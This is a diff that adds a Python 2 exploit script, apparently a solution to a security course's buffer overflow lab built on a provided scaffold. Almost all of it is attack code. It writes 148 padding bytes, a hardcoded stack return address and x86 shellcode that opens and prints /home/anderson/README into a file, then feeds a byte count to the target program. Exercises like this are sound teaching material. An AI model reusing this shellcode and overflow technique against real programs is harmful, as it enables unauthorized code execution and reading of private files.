@@ -1,0 +1,37 @@
+#!/usr/bin/env python2
+
+from scaffold import *
+
+### YOUR CODE STARTS HERE ###
+
+f = open("hack", "w")
+
+p.start()
+SHELLCODE = \
+    "\x31\xc0\x31\xdb\x31\xc9\x31\xd2" \
+    "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd" \
+    "\x80\x89\xc6\xeb\x06\xb0\x01\x31" \
+    "\xdb\xcd\x80\x89\xf3\xb0\x03\x83" \
+    "\xec\x01\x8d\x0c\x24\xb2\x01\xcd" \
+    "\x80\x31\xdb\x39\xc3\x74\xe6\xb0" \
+    "\x04\xb3\x02\xb2\x01\xcd\x80\x83" \
+    "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff" \
+    "\xff/home/anderson/README\x00"
+if p.recv(30) == 'How many bytes should I read? ':
+    addr = '\xc0\xf6\xff\xbf'
+    f.write('A'*148+addr+SHELLCODE)
+    f.flush()
+    f.close()
+
+###p.start()
+p.send('250\n')
+
+### assert p.recvline() == 'How many bytes should I read? Here is the file!'
+### assert p.recvline() == 'Hello world!'
+
+### YOUR CODE  ENDS  HERE ###
+
+returncode = p.end()
+
+if returncode == -11: print 'segmentation fault or stack canary!'
+elif returncode != 0: print 'return code', returncode
